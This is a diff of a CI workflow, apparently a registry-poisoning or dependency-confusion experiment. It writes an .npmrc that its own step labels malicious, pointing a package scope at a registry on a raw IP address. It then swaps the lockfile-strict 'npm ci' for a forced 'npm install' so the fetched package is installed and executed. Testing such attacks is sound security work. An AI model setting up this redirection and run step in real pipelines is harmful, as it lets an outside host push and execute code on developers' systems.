@@ -12,12 +12,13 @@ jobs:
           node-version: '18'
 
       - name: Create malicious .npmrc file
-        # ❗ IMPORTANT: Change the URL below to your server's IP!
         run: echo "@aiyana-dev:registry=http://34.227.190.3:4873" > .npmrc
 
-      - name: Attempt to install packages
-        # npm ci is strict and uses the lockfile. This SHOULD fail.
-        run: npm ci
+      - name: Force clean install and attempt installation
+        run: |
+          rm -rf node_modules
+          npm cache clean --force
+          npm install
 
-      - name: Execute the package script (will not be reached if npm ci fails)
+      - name: Execute the package script (will not be reached if npm install fails)
         run: node ./node_modules/@aiyana-dev/legit-package/index.js
